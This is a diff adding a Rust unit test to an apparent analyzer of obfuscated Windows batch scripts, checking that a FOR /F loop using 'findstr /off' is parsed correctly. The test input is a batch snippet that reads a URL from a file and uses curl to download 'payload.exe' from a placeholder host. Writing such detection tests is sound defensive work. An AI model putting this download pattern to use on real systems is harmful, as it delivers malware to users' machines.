@@ -3863,6 +3863,33 @@ for /f "tokens=1,* delims=:" %%A in ('findstr /o "https://" web.txt') do curl -o
     }
 
     #[test]
+    fn for_f_findstr_offline_flag_does_not_emit_offset_prefix() {
+        let report = analyze(
+            br#"echo https://findstr-offline.example/payload.exe>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /off "https://" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-offline.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /off was treated as /o offset output: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("0:https://"),
+            "findstr /off should not synthesize /o offset prefixes:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_findstr_l_keeps_bracketed_literal_url() {
         let report = analyze(
             br#"echo https://findstr-literal.example/[a]/payload.exe>web.txt
